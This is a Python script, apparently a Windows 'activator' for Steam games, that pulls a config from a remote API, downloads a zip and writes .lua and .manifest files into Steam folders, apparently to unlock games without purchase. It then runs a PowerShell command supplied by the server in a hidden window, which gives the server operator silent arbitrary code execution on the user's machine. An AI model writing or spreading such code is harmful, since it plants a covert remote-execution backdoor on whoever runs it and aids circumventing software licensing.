import os
import sys
import zipfile
import shutil
import time
import psutil
import requests
# webbrowser removido para evitar abertura de abas
import subprocess
import ctypes

API_URL = 'https://gaamingsteam.squareweb.app/api/app/'
APP_ID = 'kastexstorms'
ID_JOGO = 'ID QUALUQER GAME'

class Ativador:
    def __init__(self):
        self.caminho_steam = self._detectar_caminho_steam()
        self.config = self._buscar_config_api()

    def _buscar_config_api(self):
        url = API_URL + APP_ID + '/' + ID_JOGO
        try:
            response = requests.get(url, timeout=10)
            if response.status_code in (403, 404, 401):
                self._mostrar_erro_licenca()
                return None
            data = response.json()
            if not data.get('ativo', False):
                self._mostrar_erro_licenca()
                return None
            return {
                'url_dll': data.get('url_dll'),
                'nome_dll': data.get('nome_dll'),
                'comando_powershell': data.get('comando_powershell'),
                'url_zip': data.get('url_zip'),
                'caminho_lua': data.get('caminho_lua'),
                'caminho_manifest': data.get('caminho_manifest'),
            }
        except Exception:
            self._mostrar_erro_conexao()
            return None

    def _mostrar_erro_licenca(self):
        mensagem = 'Seu acesso foi desativado ou expirou.\n\nEntre em contato com o suporte.'
        ctypes.windll.user32.MessageBoxW(0, mensagem, 'Licença Inválida', 0)

    def _mostrar_erro_conexao(self):
        mensagem = 'Não foi possível conectar ao servidor.\n\nVerifique sua internet.'
        ctypes.windll.user32.MessageBoxW(0, mensagem, 'Erro de Conexão', 0)

    def _detectar_caminho_steam(self):
        # Busca simplificada para Windows
        possiveis = [
            os.path.expandvars('%ProgramFiles(x86)%\\Steam\\steam.exe'),
            os.path.expandvars('%ProgramFiles%\\Steam\\steam.exe'),
            'C:\\Steam\\steam.exe'
        ]
        for p in possiveis:
            if os.path.exists(p): return p
        return None

    def _encontrar_pasta_documentos(self):
        doc = os.path.join(os.path.expanduser('~'), 'Documents')
        return doc if os.path.exists(doc) else os.path.join(os.path.expanduser('~'), 'Documentos')

    def ativar_jogo(self):
        pasta_docs = self._encontrar_pasta_documentos()
        pasta_conteudo = os.path.join(pasta_docs, 'conteudo')
        if not os.path.exists(pasta_conteudo): return

        zips = [f for f in os.listdir(pasta_conteudo) if f.lower().endswith('.zip')]
        reiniciar = False

        for zip_nome in zips:
            caminho_zip = os.path.join(pasta_conteudo, zip_nome)
            try:
                with zipfile.ZipFile(caminho_zip, 'r') as zip_ref:
                    for nome in zip_ref.namelist():
                        nome_final = nome.split('/')[-1]
                        if nome_final.lower().endswith('.lua'):
                            destino = self.config.get('caminho_lua')
                        elif nome_final.lower().endswith(('.st', '.manifest')):
                            destino = self.config.get('caminho_manifest')
                        else: continue

                        if destino:
                            os.makedirs(destino, exist_ok=True)
                            with zip_ref.open(nome) as src, open(os.path.join(destino, nome_final), 'wb') as tgt:
                                tgt.write(src.read())
                            reiniciar = True
            except: pass

        if reiniciar: self._executar_comando_steam_update()

    def _executar_comando_steam_update(self):
        if not self.config or not self.config.get('comando_powershell'): return
        try:
            subprocess.Popen(['powershell', '-Command', self.config['comando_powershell']], 
                             creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

    def ativacao_automatica(self):
        pasta_docs = self._encontrar_pasta_documentos()
        pasta_conteudo = os.path.join(pasta_docs, 'conteudo')
        if not os.path.exists(pasta_conteudo): os.makedirs(pasta_conteudo)

        if self.baixar_e_salvar_zip(ID_JOGO, pasta_conteudo):
            self.ativar_jogo()
            # O código para abrir o site foi removido daqui
            ctypes.windll.user32.MessageBoxW(0, "Jogo ativado com sucesso!", "Status", 0)

    def baixar_e_salvar_zip(self, id_jogo, pasta_conteudo):
        url = self.config.get('url_zip') if self.config else None
        if not url: return False
        caminho = os.path.join(pasta_conteudo, f"{id_jogo}.zip")
        try:
            r = requests.get(url, stream=True, timeout=300)
            r.raise_for_status()
            with open(caminho, 'wb') as f:
                for chunk in r.iter_content(8192): f.write(chunk)
            return True
        except: return False

if __name__ == '__main__':
    ativador = Ativador()
    if ativador.config:
        ativador.ativacao_automatica()
